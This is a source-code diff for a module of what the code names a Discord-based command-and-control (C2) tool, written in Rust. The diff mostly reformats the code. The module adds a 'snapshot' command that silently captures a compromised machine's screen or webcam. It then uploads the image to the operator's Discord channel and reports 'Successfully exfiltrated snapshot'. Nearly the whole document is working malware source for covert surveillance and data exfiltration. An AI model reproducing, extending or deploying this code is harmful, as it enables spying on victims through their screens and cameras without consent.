@@ -1,119 +1,125 @@
-use crate::{errors::DiscordC2Error, libraries::nokhwa_wrapper::wrapper};
-
-use serenity::{
-    builder::{CreateApplicationCommand, CreateApplicationCommandOption},
-    client::Context,
-    model::{
-        application::command::CommandOptionType,
-        application::interaction::application_command::{
-            ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
-        },
-        application::interaction::InteractionResponseType,
-        channel::AttachmentType,
-    },
-};
+use std::borrow::Cow;
 
 use chrono::Utc;
 use nokhwa::utils::{CameraIndex, CameraInfo};
 use screenshots::Screen;
-use std::borrow::Cow;
+use serenity::{
+	builder::{CreateApplicationCommand, CreateApplicationCommandOption},
+	client::Context,
+	model::{
+		application::{
+			command::CommandOptionType,
+			interaction::{
+				application_command::{
+					ApplicationCommandInteraction,
+					CommandDataOption,
+					CommandDataOptionValue,
+				},
+				InteractionResponseType,
+			},
+		},
+		channel::AttachmentType,
+	},
+};
 use tracing::error;
+
+use crate::{errors::DiscordC2Error, libraries::nokhwa_wrapper::wrapper};
 
 /// Creates a screen sub-option, given a mutable reference to a CreateApplicationCommandOption.
 /// ### Returns
 /// A mutable reference to a CreateApplicationCommandOption
 #[cfg(target_os = "windows")]
 fn create_screen_option(
-    sub_command: &mut CreateApplicationCommandOption,
+	sub_command: &mut CreateApplicationCommandOption,
 ) -> &mut CreateApplicationCommandOption {
-    let screens = Screen::all().unwrap(); //TODO: check for errors
-    let mut screen_option = sub_command
-        .name("screen")
-        .description("Take a snapshot of the screen")
-        .kind(CommandOptionType::SubCommand);
-    screen_option = screen_option.create_sub_option(|option| {
-        let mut screen_list_option = option
-            .name("screen_list")
-            .description("Choose a screen from the list")
-            .kind(CommandOptionType::Integer)
-            .required(true);
+	let screens = Screen::all().unwrap(); // TODO: check for errors
+	let mut screen_option = sub_command
+		.name("screen")
+		.description("Take a snapshot of the screen")
+		.kind(CommandOptionType::SubCommand);
+	screen_option = screen_option.create_sub_option(|option| {
+		let mut screen_list_option = option
+			.name("screen_list")
+			.description("Choose a screen from the list")
+			.kind(CommandOptionType::Integer)
+			.required(true);
 
-        for i in 0..screens.len() {
-            screen_list_option =
-                screen_list_option.add_int_choice(format!("Screen {}", i), i as i32);
-        }
-        screen_list_option
-    });
-    screen_option
+		for i in 0..screens.len() {
+			screen_list_option =
+				screen_list_option.add_int_choice(format!("Screen {}", i), i as i32);
+		}
+		screen_list_option
+	});
+	screen_option
 }
 
 /// Creates a camera sub-option, given a mutable reference to a CreateApplicationCommandOption, and a Vec of CameraInfo
 /// ### Returns
 /// A mutable reference to a CreateApplicationCommandOption
 fn create_camera_option(
-    sub_command: &mut CreateApplicationCommandOption,
-    cameras: Vec<CameraInfo>,
+	sub_command: &mut CreateApplicationCommandOption,
+	cameras: Vec<CameraInfo>,
 ) -> &mut CreateApplicationCommandOption {
-    let mut camera_option = sub_command
-        .name("camera")
-        .description("Take a snapshot from a camera")
-        .kind(CommandOptionType::SubCommand);
+	let mut camera_option = sub_command
+		.name("camera")
+		.description("Take a snapshot from a camera")
+		.kind(CommandOptionType::SubCommand);
 
-    camera_option = camera_option.create_sub_option(|option| {
-        let mut camera_list_option = option
-            .name("camera_list")
-            .description("Choose a camera from the list")
-            .kind(CommandOptionType::Integer)
-            .required(true);
+	camera_option = camera_option.create_sub_option(|option| {
+		let mut camera_list_option = option
+			.name("camera_list")
+			.description("Choose a camera from the list")
+			.kind(CommandOptionType::Integer)
+			.required(true);
 
-        // Add integer choices to the camera list option based on the number of cameras.
-        for (i, camera) in cameras.iter().enumerate() {
-            camera_list_option = camera_list_option.add_int_choice(
-                format!("{} ({})", camera.human_name(), camera.description()),
-                i as i32,
-            );
-        }
+		// Add integer choices to the camera list option based on the number of cameras.
+		for (i, camera) in cameras.iter().enumerate() {
+			camera_list_option = camera_list_option.add_int_choice(
+				format!("{} ({})", camera.human_name(), camera.description()),
+				i as i32,
+			);
+		}
 
-        camera_list_option
-    });
+		camera_list_option
+	});
 
-    camera_option
+	camera_option
 }
 
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
-    // Create the snapshot command.
-    let snapshot_command = command
-        .name("snapshot")
-        .description("Grabs a snapshot from the screen or the camera");
+	// Create the snapshot command.
+	let snapshot_command = command
+		.name("snapshot")
+		.description("Grabs a snapshot from the screen or the camera");
 
-    // This is just a depression mess not worth commenting out.
-    snapshot_command.create_option(|option| {
-        let option = option
-            .name("type")
-            .description("Type of snapshot to grab")
-            .kind(CommandOptionType::SubCommandGroup);
+	// This is just a depression mess not worth commenting out.
+	snapshot_command.create_option(|option| {
+		let option = option
+			.name("type")
+			.description("Type of snapshot to grab")
+			.kind(CommandOptionType::SubCommandGroup);
 
-        #[cfg(target_os = "windows")] //TODO: Explore how we can support linux here
-        option.create_sub_option(|sub_command| create_screen_option(sub_command));
+		#[cfg(target_os = "windows")] // TODO: Explore how we can support linux here
+		option.create_sub_option(|sub_command| create_screen_option(sub_command));
 
-        // Error handle for the camera option
-        let cameras = match wrapper::list_devices() {
-            Ok(cameras) => cameras,
-            Err(e) => {
-                error!("Error retrieving camera list: {}", e);
-                Vec::new()
-            }
-        };
+		// Error handle for the camera option
+		let cameras = match wrapper::list_devices() {
+			Ok(cameras) => cameras,
+			Err(e) => {
+				error!("Error retrieving camera list: {}", e);
+				Vec::new()
+			},
+		};
 
-        // Will only display the option if there was no error.
-        if !cameras.is_empty() {
-            option.create_sub_option(|sub_command| create_camera_option(sub_command, cameras));
-        }
+		// Will only display the option if there was no error.
+		if !cameras.is_empty() {
+			option.create_sub_option(|sub_command| create_camera_option(sub_command, cameras));
+		}
 
-        option
-    });
+		option
+	});
 
-    command
+	command
 }
 
 /// Processes a Discord command for taking a snapshot and returns an optional attachment of the specified type.
@@ -164,65 +170,65 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
 /// }
 /// ```
 pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>, DiscordC2Error> {
-    let option = options
-        .get(0)
-        .ok_or_else(|| DiscordC2Error::InvalidInput("Expected snapshot type.".to_string()))?
-        .options
-        .get(0)
-        .ok_or_else(|| {
-            DiscordC2Error::InvalidInput("Snapshot type option not found.".to_string())
-        })?;
+	let option = options
+		.get(0)
+		.ok_or_else(|| DiscordC2Error::InvalidInput("Expected snapshot type.".to_string()))?
+		.options
+		.get(0)
+		.ok_or_else(|| {
+			DiscordC2Error::InvalidInput("Snapshot type option not found.".to_string())
+		})?;
 
-    match option.name.as_str() {
-        "screen" => {
-            // Grabs the screen option from the first options key.
-            let screen_option = option.options.get(0).ok_or_else(|| {
-                DiscordC2Error::InvalidInput("Expected screen_list option.".to_string())
-            })?;
+	match option.name.as_str() {
+		"screen" => {
+			// Grabs the screen option from the first options key.
+			let screen_option = option.options.get(0).ok_or_else(|| {
+				DiscordC2Error::InvalidInput("Expected screen_list option.".to_string())
+			})?;
 
-            // Now that we have the screen option, grab the index from .resolved, or throw an error.
-            let screen_index = screen_option
-                .resolved
-                .clone()
-                .and_then(|value| match value {
-                    CommandDataOptionValue::Integer(integer) => Some(integer),
-                    _ => None,
-                })
-                .ok_or_else(|| {
-                    DiscordC2Error::InvalidInput("Invalid screen_list value.".to_string())
-                })?;
+			// Now that we have the screen option, grab the index from .resolved, or throw an error.
+			let screen_index = screen_option
+				.resolved
+				.clone()
+				.and_then(|value| match value {
+					CommandDataOptionValue::Integer(integer) => Some(integer),
+					_ => None,
+				})
+				.ok_or_else(|| {
+					DiscordC2Error::InvalidInput("Invalid screen_list value.".to_string())
+				})?;
 
-            Ok(Some(process_screen_option(screen_index as i32)?))
-        }
-        "camera" => {
-            // Grabs the camera option from the first options key.
-            let camera_option = option.options.get(0).ok_or_else(|| {
-                DiscordC2Error::InvalidInput("Expected camera_list option.".to_string())
-            })?;
+			Ok(Some(process_screen_option(screen_index as i32)?))
+		},
+		"camera" => {
+			// Grabs the camera option from the first options key.
+			let camera_option = option.options.get(0).ok_or_else(|| {
+				DiscordC2Error::InvalidInput("Expected camera_list option.".to_string())
+			})?;
 
-            // Now that we have the camera option, grab the index from .resolved, or throw an error.
-            let camera_index = camera_option
-                .resolved
-                .clone()
-                .and_then(|value| match value {
-                    CommandDataOptionValue::Integer(integer) => {
-                        Some(CameraIndex::Index(integer as u32))
-                    }
-                    _ => None,
-                })
-                .ok_or_else(|| {
-                    DiscordC2Error::InvalidInput("Invalid camera_list value.".to_string())
-                })?;
+			// Now that we have the camera option, grab the index from .resolved, or throw an error.
+			let camera_index = camera_option
+				.resolved
+				.clone()
+				.and_then(|value| match value {
+					CommandDataOptionValue::Integer(integer) => {
+						Some(CameraIndex::Index(integer as u32))
+					},
+					_ => None,
+				})
+				.ok_or_else(|| {
+					DiscordC2Error::InvalidInput("Invalid camera_list value.".to_string())
+				})?;
 
-            Ok(Some(process_camera_option(camera_index)?))
-        }
-        _ => {
-            println!("Invalid snapshot type: {}", option.name);
-            Err(DiscordC2Error::InvalidInput(
-                "Invalid snapshot type.".to_string(),
-            ))
-        }
-    }
+			Ok(Some(process_camera_option(camera_index)?))
+		},
+		_ => {
+			println!("Invalid snapshot type: {}", option.name);
+			Err(DiscordC2Error::InvalidInput(
+				"Invalid snapshot type.".to_string(),
+			))
+		},
+	}
 }
 
 /// Handles a snapshot command from a user, which triggers a file exfiltration process and sends
@@ -257,34 +263,34 @@ pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>
 /// }
 /// ```
 pub async fn snapshot_handler(
-    ctx: &Context,
-    command: &ApplicationCommandInteraction,
+	ctx: &Context,
+	command: &ApplicationCommandInteraction,
 ) -> Result<(), DiscordC2Error> {
-    let content = run(&command.data.options).await?;
+	let content = run(&command.data.options).await?;
 
-    let (message_content, message_file) = match content {
-        Some(content) => (
-            "Successfully exfiltrated snapshot:".to_owned(),
-            Some(content),
-        ),
-        None => ("There was no file available".to_owned(), None),
-    };
+	let (message_content, message_file) = match content {
+		Some(content) => (
+			"Successfully exfiltrated snapshot:".to_owned(),
+			Some(content),
+		),
+		None => ("There was no file available".to_owned(), None),
+	};
 
-    command
-        .create_interaction_response(&ctx.http, |response| {
-            response
-                .kind(InteractionResponseType::ChannelMessageWithSource)
-                .interaction_response_data(|message| {
-                    message.content(message_content);
-                    if let Some(file) = message_file {
-                        message.add_file(file);
-                    }
-                    message
-                })
-        })
-        .await?;
+	command
+		.create_interaction_response(&ctx.http, |response| {
+			response
+				.kind(InteractionResponseType::ChannelMessageWithSource)
+				.interaction_response_data(|message| {
+					message.content(message_content);
+					if let Some(file) = message_file {
+						message.add_file(file);
+					}
+					message
+				})
+		})
+		.await?;
 
-    Ok(())
+	Ok(())
 }
 
 /// Takes a snapshot from the camera with the specified index and returns it as an `AttachmentType`
@@ -314,15 +320,15 @@ pub async fn snapshot_handler(
 ///
 /// Returns a `DiscordC2Error` if an error occurs while initializing the camera or taking the snapshot.
 fn process_camera_option(index: CameraIndex) -> Result<AttachmentType<'static>, DiscordC2Error> {
-    let camera = wrapper::init_static_cam(index)?;
-    let snapshot_bytes = wrapper::snapshot(camera)?;
+	let camera = wrapper::init_static_cam(index)?;
+	let snapshot_bytes = wrapper::snapshot(camera)?;
 
-    let attachment = AttachmentType::Bytes {
-        data: Cow::from(snapshot_bytes),
-        filename: format!("screenshot{}.jpeg", Utc::now()),
-    };
+	let attachment = AttachmentType::Bytes {
+		data:     Cow::from(snapshot_bytes),
+		filename: format!("screenshot{}.jpeg", Utc::now()),
+	};
 
-    Ok(attachment)
+	Ok(attachment)
 }
 
 /// Takes a screenshot of the screen with the specified index and returns it as an `AttachmentType`
@@ -352,13 +358,13 @@ fn process_camera_option(index: CameraIndex) -> Result<AttachmentType<'static>, 
 /// Returns a `DiscordC2Error` if an error occurs while capturing the screenshot or generating the
 /// attachment.
 fn process_screen_option(index: i32) -> Result<AttachmentType<'static>, DiscordC2Error> {
-    let screens = Screen::all().unwrap();
-    let screen = screens.get(index as usize).unwrap();
-    let buffer = screen.capture()?.buffer().to_owned();
+	let screens = Screen::all().unwrap();
+	let screen = screens.get(index as usize).unwrap();
+	let buffer = screen.capture()?.buffer().to_owned();
 
-    let attachment = AttachmentType::Bytes {
-        data: Cow::from(buffer),
-        filename: format!("screenshot{}.png", Utc::now()),
-    };
-    Ok(attachment)
+	let attachment = AttachmentType::Bytes {
+		data:     Cow::from(buffer),
+		filename: format!("screenshot{}.png", Utc::now()),
+	};
+	Ok(attachment)
 }
